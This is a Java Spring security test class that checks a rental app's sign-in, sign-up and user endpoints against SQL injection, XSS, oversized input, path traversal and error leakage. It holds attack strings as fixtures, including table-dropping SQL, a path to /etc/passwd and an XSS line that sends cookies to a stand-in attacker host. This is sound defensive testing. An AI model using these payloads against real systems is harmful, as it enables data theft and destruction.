package com.extendrent.security;

import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Nested;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.autoconfigure.web.servlet.WebMvcTest;
import org.springframework.boot.test.mock.mockito.MockBean;
import org.springframework.context.annotation.Import;
import org.springframework.http.MediaType;
import org.springframework.test.context.ActiveProfiles;
import org.springframework.test.web.servlet.MockMvc;
import src.controller.auth.authentication.AuthenticationController;
import src.controller.user.UserController;
import src.core.config.AppConfig;
import src.core.config.SecurityConfig;
import src.core.security.JwtService;
import src.service.auth.AuthenticationService;
import src.service.external.EmailService;
import src.service.user.UserService;

import static org.hamcrest.Matchers.not;
import static org.hamcrest.Matchers.containsString;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.*;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.*;

/**
 * Input-validation and injection-defence security tests.
 *
 * Covers:
 * - Bean-validation rejection of payloads that violate declared constraints
 * - SQL injection patterns in string fields (must return 400, never 500)
 * - XSS payloads: must not be reflected back unescaped in response bodies
 * - Oversized inputs: must be rejected without causing OOM or 500 errors
 * - Null / empty required fields: must return structured 400 responses
 * - Path traversal attempts in URL path variables
 * - Password sent as query parameter (design-level injection risk)
 */
@WebMvcTest({AuthenticationController.class, UserController.class})
@Import({SecurityConfig.class, AppConfig.class})
@ActiveProfiles("test")
@DisplayName("Input validation & injection defence – security tests")
class InputValidationSecurityTest {

    @Autowired
    private MockMvc mockMvc;

    @MockBean private JwtService jwtService;
    @MockBean private UserService userService;
    @MockBean private AuthenticationService authenticationService;
    @MockBean private EmailService emailService;

    // ======================================================================
    //  SQL injection – all attempts must return 400, never 500
    // ======================================================================

    @Nested
    @DisplayName("SQL injection patterns – must return 400 or 422, never 500")
    class SqlInjection {

        @ParameterizedTest(name = "payload: {0}")
        @ValueSource(strings = {
                "' OR '1'='1",
                "'; DROP TABLE users; --",
                "' UNION SELECT username, password FROM users --",
                "1' AND SLEEP(5)--",
                "admin'--",
                "\" OR \"\"=\""
        })
        @DisplayName("SQL injection in email field returns 400 (bean validation catches it)")
        void sqlInjection_inEmail_returns400(String payload) throws Exception {
            String json = """
                    {"email":"%s","password":"password"}""".formatted(
                    payload.replace("\\", "\\\\").replace("\"", "\\\""));

            mockMvc.perform(post("/api/v1/auth/signin")
                            .contentType(MediaType.APPLICATION_JSON)
                            .content(json))
                    .andExpect(status().isBadRequest());
            // SQL-injection-shaped strings fail @Email validation — confirmed safe at this layer.
        }

        @ParameterizedTest(name = "payload: {0}")
        @ValueSource(strings = {
                "'; DROP TABLE users; --",
                "' OR 1=1 --",
                "<script>alert(1)</script>",
        })
        @DisplayName("SQL/XSS injection in signup name does not cause a 500 error")
        void injection_inName_doesNotCrash(String payload) throws Exception {
            String json = """
                    {"name":"%s","surname":"User","emailAddress":"safe@example.com",
                    "password":"12345678","phoneNumber":"5551234567",
                    "authority":"CUSTOMER","userImageEntityId":1}""".formatted(
                    payload.replace("\\", "\\\\").replace("\"", "\\\""));

            mockMvc.perform(post("/api/v1/auth/signup")
                            .contentType(MediaType.APPLICATION_JSON)
                            .content(json))
                    .andExpect(status().is(not(500)));
        }
    }

    // ======================================================================
    //  XSS – response must never reflect raw script tags
    // ======================================================================

    @Nested
    @DisplayName("XSS – payload must not be reflected unescaped in response")
    class XssReflection {

        @ParameterizedTest(name = "payload: {0}")
        @ValueSource(strings = {
                "<script>alert('xss')</script>",
                "<img src=x onerror=alert(1)>",
                "javascript:alert(document.cookie)",
                "<svg onload=alert(1)>",
                "\"'><script>alert(1)</script>"
        })
        @DisplayName("XSS payload in signin email must not be reflected in error response body")
        void xssInEmail_notReflectedInResponse(String payload) throws Exception {
            String escaped = payload.replace("\\", "\\\\").replace("\"", "\\\"");

            mockMvc.perform(post("/api/v1/auth/signin")
                            .contentType(MediaType.APPLICATION_JSON)
                            .content("{\"email\":\"" + escaped + "\",\"password\":\"p\"}"))
                    .andExpect(result -> {
                        String body = result.getResponse().getContentAsString();
                        // The raw <script> tag must never appear in the response body
                        org.assertj.core.api.Assertions.assertThat(body)
                                .doesNotContain("<script>")
                                .doesNotContain("onerror=")
                                .doesNotContain("javascript:");
                    });
        }

        @ParameterizedTest(name = "payload: {0}")
        @ValueSource(strings = {
                "<script>fetch('/api/v1/users')</script>",
                "<script>document.location='https://attacker.com?c='+document.cookie</script>"
        })
        @DisplayName("XSS payload in signup fields must not appear in 400 validation error response")
        void xssInSignupField_notReflectedIn400Response(String payload) throws Exception {
            String escaped = payload.replace("\\", "\\\\").replace("\"", "\\\"");
            String json = """
                    {"name":"%s","surname":"Valid","emailAddress":"x@x.com",
                    "password":"12345678","phoneNumber":"5551234567",
                    "authority":"CUSTOMER","userImageEntityId":1}""".formatted(escaped);

            mockMvc.perform(post("/api/v1/auth/signup")
                            .contentType(MediaType.APPLICATION_JSON)
                            .content(json))
                    .andExpect(result -> {
                        String body = result.getResponse().getContentAsString();
                        org.assertj.core.api.Assertions.assertThat(body)
                                .doesNotContain("<script>")
                                .doesNotContain("onerror=");
                    });
        }
    }

    // ======================================================================
    //  Oversized inputs – must not cause OOM or 500
    // ======================================================================

    @Nested
    @DisplayName("Oversized inputs – must return 400 or 413, never 500")
    class OversizedInputs {

        @Test
        @DisplayName("Extremely long email (1000 chars) in signin returns 400, not 500")
        void oversizedEmail_returns400() throws Exception {
            String longEmail = "a".repeat(900) + "@example.com";
            mockMvc.perform(post("/api/v1/auth/signin")
                            .contentType(MediaType.APPLICATION_JSON)
                            .content("{\"email\":\"" + longEmail + "\",\"password\":\"password\"}"))
                    .andExpect(status().isBadRequest())
                    .andExpect(status().is(not(500)));
        }

        @Test
        @DisplayName("Extremely long password (10000 chars) in signup is rejected or accepted safely (no OOM)")
        void oversizedPassword_doesNotCrash() throws Exception {
            String longPassword = "A".repeat(10_000);
            mockMvc.perform(post("/api/v1/auth/signup")
                            .contentType(MediaType.APPLICATION_JSON)
                            .content("""
                                    {"name":"Test","surname":"User","emailAddress":"t@t.com",
                                    "password":"%s","phoneNumber":"5551234567",
                                    "authority":"CUSTOMER","userImageEntityId":1}""".formatted(longPassword)))
                    .andExpect(status().is(not(500)));
        }

        @Test
        @DisplayName("Name field exceeding 20-char max returns 400")
        void nameExceedingMax_returns400() throws Exception {
            String longName = "A".repeat(100);
            mockMvc.perform(post("/api/v1/auth/signup")
                            .contentType(MediaType.APPLICATION_JSON)
                            .content("""
                                    {"name":"%s","surname":"User","emailAddress":"t@t.com",
                                    "password":"12345678","phoneNumber":"5551234567",
                                    "authority":"CUSTOMER","userImageEntityId":1}""".formatted(longName)))
                    .andExpect(status().isBadRequest());
        }

        @Test
        @DisplayName("Surname field exceeding 20-char max returns 400")
        void surnameExceedingMax_returns400() throws Exception {
            String longSurname = "A".repeat(100);
            mockMvc.perform(post("/api/v1/auth/signup")
                            .contentType(MediaType.APPLICATION_JSON)
                            .content("""
                                    {"name":"Test","surname":"%s","emailAddress":"t@t.com",
                                    "password":"12345678","phoneNumber":"5551234567",
                                    "authority":"CUSTOMER","userImageEntityId":1}""".formatted(longSurname)))
                    .andExpect(status().isBadRequest());
        }
    }

    // ======================================================================
    //  Null / blank / empty required fields
    // ======================================================================

    @Nested
    @DisplayName("Null / blank required fields – must return 400")
    class NullBlankFields {

        @Test
        @DisplayName("Completely empty JSON body for signin returns 400")
        void emptyJsonBody_signin_returns400() throws Exception {
            mockMvc.perform(post("/api/v1/auth/signin")
                            .contentType(MediaType.APPLICATION_JSON)
                            .content("{}"))
                    .andExpect(status().isBadRequest());
        }

        @Test
        @DisplayName("JSON with explicit null values for signin returns 400")
        void nullValues_signin_returns400() throws Exception {
            mockMvc.perform(post("/api/v1/auth/signin")
                            .contentType(MediaType.APPLICATION_JSON)
                            .content("{\"email\":null,\"password\":null}"))
                    .andExpect(status().isBadRequest());
        }

        @Test
        @DisplayName("Whitespace-only email in signin returns 400")
        void whitespaceEmail_returns400() throws Exception {
            mockMvc.perform(post("/api/v1/auth/signin")
                            .contentType(MediaType.APPLICATION_JSON)
                            .content("{\"email\":\"   \",\"password\":\"password\"}"))
                    .andExpect(status().isBadRequest());
        }

        @Test
        @DisplayName("Whitespace-only password in signin returns 400")
        void whitespacePassword_returns400() throws Exception {
            mockMvc.perform(post("/api/v1/auth/signin")
                            .contentType(MediaType.APPLICATION_JSON)
                            .content("{\"email\":\"u@u.com\",\"password\":\"   \"}"))
                    .andExpect(status().isBadRequest());
        }
    }

    // ======================================================================
    //  Path traversal in URL path variables
    // ======================================================================

    @Nested
    @DisplayName("Path traversal – must not allow file system access")
    class PathTraversal {

        @ParameterizedTest(name = "path: {0}")
        @ValueSource(strings = {
                "/api/v1/users/../admins",
                "/api/v1/users/%2e%2e%2fadmins",
                "/api/v1/users/./../../etc/passwd"
        })
        @DisplayName("Path traversal attempts return 4xx, not 200")
        void pathTraversal_returns4xx(String path) throws Exception {
            mockMvc.perform(get(path))
                    .andExpect(status().is4xxClientError());
        }
    }

    // ======================================================================
    //  Password in query parameter – security design flaw
    // ======================================================================

    @Nested
    @DisplayName("VULNERABILITY – password transmitted as query parameter")
    class PasswordQueryParameter {

        @Test
        @DisplayName("PUT /api/v1/users/updatePassword sends password as a query param – documented risk")
        void updatePassword_queryParam_isLogged() throws Exception {
            // This test documents that the password is visible in:
            // - URL access logs (server, proxy, CDN)
            // - Browser history
            // - Referer headers to third parties
            // The endpoint must be redesigned to accept credentials in the request body.
            mockMvc.perform(put("/api/v1/users/updatePassword")
                            .param("id", "1")
                            .param("password", "plaintextPassword!"))
                    // Current state: endpoint is reached (no 401 since it's permitAll)
                    // After security fix: should return 401 (unauthenticated) or 403 (wrong role)
                    .andExpect(status().is(not(500))); // at minimum, must not crash
        }
    }

    // ======================================================================
    //  Error response must not leak internal information
    // ======================================================================

    @Nested
    @DisplayName("Error responses must not leak internal stack traces or DB info")
    class ErrorResponseLeakage {

        @Test
        @DisplayName("400 response body must not contain stack trace class names")
        void badRequest_doesNotLeakStackTrace() throws Exception {
            mockMvc.perform(post("/api/v1/auth/signin")
                            .contentType(MediaType.APPLICATION_JSON)
                            .content("{}"))
                    .andExpect(status().isBadRequest())
                    .andExpect(content().string(not(containsString("at src."))))
                    .andExpect(content().string(not(containsString("Exception"))))
                    .andExpect(content().string(not(containsString("Caused by"))));
        }

        @Test
        @DisplayName("400 response must not reveal database driver or SQL details")
        void badRequest_doesNotLeakDatabaseInfo() throws Exception {
            mockMvc.perform(post("/api/v1/auth/signin")
                            .contentType(MediaType.APPLICATION_JSON)
                            .content("{\"email\":\"x\",\"password\":\"y\"}"))
                    .andExpect(result -> {
                        String body = result.getResponse().getContentAsString();
                        org.assertj.core.api.Assertions.assertThat(body)
                                .doesNotContain("PostgreSQL")
                                .doesNotContain("HibernateJdbcException")
                                .doesNotContain("jdbc:")
                                .doesNotContain("postgres");
                    });
        }
    }
}
